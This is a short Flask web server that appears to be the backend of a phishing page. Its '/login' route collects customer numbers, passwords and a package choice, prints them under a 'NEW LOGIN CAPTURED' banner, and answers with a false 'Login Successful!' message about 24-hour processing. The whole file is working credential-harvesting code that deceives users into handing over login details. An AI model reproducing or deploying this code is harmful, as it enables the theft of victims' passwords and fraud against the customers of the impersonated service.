from flask import Flask, render_template, request
from datetime import datetime

app = Flask(__name__)

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    cust_num = request.form.get('customer_number')
    password = request.form.get('password')
    package = request.form.get('package')
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    print("\n==============================")
    print("      NEW LOGIN CAPTURED      ")
    print("==============================")
    print(f"Customer Number : {cust_num}")
    print(f"Password        : {password}")
    print(f"Selected Package: {package}")
    print(f"Report Window   : {timestamp} (24 Hours Processing)")
    print("------------------------------\n")
    return "Login Successful! Your request is registered for 24-hour processing."

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)